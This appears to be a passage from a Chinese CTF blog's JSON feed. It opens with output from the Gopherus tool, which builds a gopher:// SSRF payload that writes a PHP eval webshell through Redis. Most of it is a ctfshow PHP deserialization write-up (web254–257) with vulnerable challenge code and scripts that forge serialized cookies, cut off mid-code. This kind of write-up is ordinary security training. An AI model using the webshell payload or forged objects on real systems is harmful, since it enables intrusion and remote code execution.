class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿MSI)-[/home/g01den/Tools/Gopherus]</span><br><span class=\"line\">└─# python2 gopherus.py --exploit redis</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  ________              .__</span><br><span class=\"line\"> /  _____/  ____ ______ |  |__   ___________ __ __  ______</span><br><span class=\"line\">/   \\  ___ /  _ \\\\____ \\|  |  \\_/ __ \\_  __ \\  |  \\/  ___/</span><br><span class=\"line\">\\    \\_\\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \\  ___/|  | \\/  |  /\\___ \\</span><br><span class=\"line\"> \\______  /\\____/|   __/|___|  /\\___  &gt;__|  |____//____  &gt;</span><br><span class=\"line\">        \\/       |__|        \\/     \\/                 \\/</span><br><span class=\"line\"></span><br><span class=\"line\">                author: $_SpyD3r_$</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Ready To get SHELL</span><br><span class=\"line\"></span><br><span class=\"line\">What do you want?? (ReverseShell/PHPShell): php</span><br><span class=\"line\"></span><br><span class=\"line\">Give web root location of server (default is /var/www/html):</span><br><span class=\"line\">Give PHP Payload (We have default PHP Shell): &lt;?php eval($_post[1]);?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Your gopher link is Ready to get PHP Shell:</span><br><span class=\"line\"></span><br><span class=\"line\">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_post%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class=\"line\"></span><br><span class=\"line\">When it&#x27;s done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter.</span><br><span class=\"line\"></span><br><span class=\"line\">-----------Made-by-SpyD3r-----------</span><br></pre></td></tr></table></figure>\n<p>​\t\t不知为啥，我的还是用不了，不过，照理来说，发送了之后访问 shell.php 就能 rce 了。</p>\n",
            "tags": [
                "Web"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/4fb535d6.html",
            "url": "http://blog.g01den.top/posts/4fb535d6.html",
            "title": "ctfshow-反序列化",
            "date_published": "2024-09-17T12:19:47.000Z",
            "content_html": "<h1 id=\"一些基础\"><a class=\"markdownIt-Anchor\" href=\"#一些基础\">#</a> 一些基础：</h1>\n<blockquote>\n<p>private 变量会被序列化为：\\x00 类名 \\x00 变量名<br>\n protected 变量会被序列化为: \\x00*\\x00 变量名<br>\n public 变量会被序列化为：变量名</p>\n<p>__sleep ()    // 在对象被序列化之前运行  *</p>\n<p>__wakeup ()   // 将在反序列化之后立即调用（当反序列化时变量个数与实际不符是会绕过）  *<br>\n 如果类中同时定义了 __unserialize () 和 __wakeup () 两个魔术方法， 则只有 __unserialize () 方法会生效，<strong>wakeup () 方法会被忽略。此特性自 PHP 7.4.0 起可用。</strong></p>\n<p>construct () // 当对象被创建时，会触发进行初始化<br>\n__destruct () // 对象被销毁时触发__toString ()： // 当一个对象被当作字符串使用时触发<br>\n__call () // 在对象上下文中调用不可访问的方法时触发__callStatic () // 在静态上下文中调用不可访问的方法时触发<br>\n__get () // 获得一个类的成员变量时调用，用于从不可访问的</p>\n<p>属性读取数据（不可访问的属性包括：1. 属性是私有型。2. 类中不存在的成员变量）<br>\n__set () // 用于将数据写入不可访问的属性</p>\n<p>__isset () // 在不可访问的属性上调用 isset () 或 empty () 触发<br>\n__unset () // 在不可访问的属性上使用 unset () 时触发</p>\n<p>__toString () // 把类当作字符串使用时触发<br>\n__invoke () // 当尝试以调用函数的方式调用一个对象时</p>\n</blockquote>\n<h1 id=\"web254\"><a class=\"markdownIt-Anchor\" href=\"#web254\">#</a> web254</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfShowUser</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$isVip</span>=<span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkVip</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;isVip;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span>(<span class=\"params\"><span class=\"variable\">$u</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>-&gt;username===<span class=\"variable\">$u</span>&amp;&amp;<span class=\"variable language_\">$this</span>-&gt;password===<span class=\"variable\">$p</span>)&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;isVip=<span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;isVip;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">vipOneKeyGetFlag</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>-&gt;isVip)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;your flag is &quot;</span>.<span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;no vip, no flag&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$username</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$password</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$username</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$password</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$user</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">ctfShowUser</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$user</span>-&gt;<span class=\"title function_ invoke__\">login</span>(<span class=\"variable\">$username</span>,<span class=\"variable\">$password</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$user</span>-&gt;<span class=\"title function_ invoke__\">checkVip</span>())&#123;</span><br><span class=\"line\">            <span class=\"variable\">$user</span>-&gt;<span class=\"title function_ invoke__\">vipOneKeyGetFlag</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;no vip,no flag&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t这个题就是简单的逻辑，首先是登陆，判断账号密码是否为 xxxxxx，是的话 isVip 则返回 true，之后检测 isVip 是否为 true，是的话就输出 flag。</p>\n<p>​\t\t因此，直接 get 传两个参数，username 和 password 都是 xxxxxx 即可出 flag。</p>\n<h1 id=\"web255\"><a class=\"markdownIt-Anchor\" href=\"#web255\">#</a> web255：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfShowUser</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$isVip</span>=<span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkVip</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;isVip;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span>(<span class=\"params\"><span class=\"variable\">$u</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;username===<span class=\"variable\">$u</span>&amp;&amp;<span class=\"variable language_\">$this</span>-&gt;password===<span class=\"variable\">$p</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">vipOneKeyGetFlag</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>-&gt;isVip)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;your flag is &quot;</span>.<span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;no vip, no flag&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$username</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$password</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$username</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$password</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$user</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;user&#x27;</span>]);    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$user</span>-&gt;<span class=\"title function_ invoke__\">login</span>(<span class=\"variable\">$username</span>,<span class=\"variable\">$password</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$user</span>-&gt;<span class=\"title function_ invoke__\">checkVip</span>())&#123;</span><br><span class=\"line\">            <span class=\"variable\">$user</span>-&gt;<span class=\"title function_ invoke__\">vipOneKeyGetFlag</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;no vip,no flag&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t逻辑挺简单的，就是从 cookie 取一个序列化后的字符串，进行反序列化，这个类就实例化成一个对象 user，然后对这个对象进行操作，进行 login，但是 login 只会返回一个真或者假，不会操作 isVip 参数，之后的 checkVip 会检测 isVip 的值，为真则输出 flag，所以，生成的序列化字符串要求是 isVip 属性得是真，所以生成的脚本如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfShowUser</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$isVip</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">ctfShowUser</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure>\n<h1 id=\"web256\"><a class=\"markdownIt-Anchor\" href=\"#web256\">#</a> web256：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfShowUser</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$isVip</span>=<span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkVip</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;isVip;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span>(<span class=\"params\"><span class=\"variable\">$u</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;username===<span class=\"variable\">$u</span>&amp;&amp;<span class=\"variable language_\">$this</span>-&gt;password===<span class=\"variable\">$p</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">vipOneKeyGetFlag</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>-&gt;isVip)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>-&gt;username!==<span class=\"variable language_\">$this</span>-&gt;password)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;your flag is &quot;</span>.<span class=\"variable\">$flag</span>;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;no vip, no flag&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$username</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$password</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$username</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$password</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$user</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;user&#x27;</span>]);    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$user</span>-&gt;<span class=\"title function_ invoke__\">login</span>(<span class=\"variable\">$username</span>,<span class=\"variable\">$password</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$user</span>-&gt;<span class=\"title function_ invoke__\">checkVip</span>())&#123;</span><br><span class=\"line\">            <span class=\"variable\">$user</span>-&gt;<span class=\"title function_ invoke__\">vipOneKeyGetFlag</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;no vip,no flag&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t这个题在这个函数里有个问题：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">vipOneKeyGetFlag</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>-&gt;isVip)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>-&gt;username!==<span class=\"variable language_\">$this</span>-&gt;password)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;your flag is &quot;</span>.<span class=\"variable\">$flag</span>;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;no vip, no flag&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里很明显，当账号和密码相等的时候，就不会输出 flag，当不等的时候就输出，所以，需要通过反序列化将 username 或者 password 改一个，使他们不相等，之后 get 传参的时候传入修改之后的就行了。生成 cookie 的脚本如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfShowUser</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$isVip</span>=<span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">ctfShowUser</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;isVip = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;password = <span class=\"string\">&quot;xxxxx&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">?username=xxxxxx&amp;password=xxxxx</span><br></pre></td></tr></table></figure>\n<h1 id=\"web257\"><a class=\"markdownIt-Anchor\" href=\"#web257\">#</a> web257：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfShowUser</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$isVip</span>=<span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$class</span> = <span class=\"string\">&#x27;info&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span>=<span class=\"title\">new</span> <span class=\"title\">info</span>();</span></span><br><span class=\"line\"><span class=\"class\">    &#125;</span></span><br><span class=\"line\"><span class=\"class\">    <span class=\"title\">public</span> <span class=\"title\">function</span> <span class=\"title\">login</span>($<span class=\"title\">u</span>,$<span class=\"title\">p</span>)</span>&#123;</span><br><span class=\"line\">        <span 